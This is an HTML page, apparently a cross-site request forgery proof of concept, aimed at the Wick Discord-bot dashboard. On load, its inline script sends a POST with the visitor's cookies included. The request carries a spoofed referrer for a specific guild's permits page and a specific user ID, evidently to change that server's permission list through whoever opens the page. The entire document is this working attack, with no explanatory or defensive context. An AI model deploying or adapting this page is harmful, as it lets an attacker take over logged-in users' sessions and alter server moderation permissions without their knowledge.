<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Modify Settings</title>
  </head>
  <body>
    <h1>Modifying User Permissions</h1>
    <script>
      // Define your fetch request
      fetch("https://dashboard.wickbot.com/api/fetch/users", {
        method: "POST",
        headers: {
          "accept": "*/*",
          "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
          "cache": "no-store",
          "content-type": "application/json",
          "priority": "u=1, i",
          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
          "sec-ch-ua-arch": "\"x86\"",
          "sec-ch-ua-bitness": "\"64\"",
          "sec-ch-ua-full-version": "\"135.0.7049.41\"",
          "sec-ch-ua-full-version-list": "\"Google Chrome\";v=\"135.0.7049.41\", \"Not-A.Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"135.0.7049.41\"",
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-model": "\"\"",
          "sec-ch-ua-platform": "\"Windows\"",
          "sec-ch-ua-platform-version": "\"10.0.0\"",
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin"
        },
        referrer: "https://dashboard.wickbot.com/guilds/1358289702414979255/permits",
        body: JSON.stringify({
          data: {
            IDS: ["1354963246221623386"]
          }
        }),
        credentials: "include", // Ensure cookies are sent along with the request
      })
      .then(response => response.json())
      .then(data => {
        console.log('Response:', data);
        alert('Settings updated successfully!');
      })
      .catch(error => {
        console.error('Error:', error);
        alert('Failed to update settings.');
      });
    </script>
  </body>
</html>
